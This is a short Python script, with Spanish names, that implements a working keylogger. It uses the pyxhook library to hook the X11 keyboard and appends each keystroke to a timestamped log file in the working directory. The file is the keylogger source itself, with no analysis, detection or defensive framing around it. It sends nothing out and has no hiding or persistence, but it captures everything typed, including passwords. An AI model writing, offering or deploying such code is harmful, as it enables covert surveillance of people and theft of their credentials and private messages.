import pyxhook, os
from datetime import datetime

def main():
    archivo_log = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'
    
    def PresionarTecla(event):
        with open(archivo_log, "a") as x:
            if event.Key == 'P_Enter' :
                x.write('\n')
            else:
                x.write(f"{chr(event.Ascii)}")

    
    key_logger = pyxhook.HookManager()
    key_logger.KeyDown = PresionarTecla
    key_logger.HookKeyboard()

    try:
        key_logger.start()
    except KeyboardInterrupt:
        key_logger.cancel()
        pass
    except Exception as problema:
        txt = f"No se pudo registrar el caracter:\n {problema}"
        with open(archivo_log, "a") as x:
            x.write(f"\n{txt}")


if __name__ == "__main__":
    main()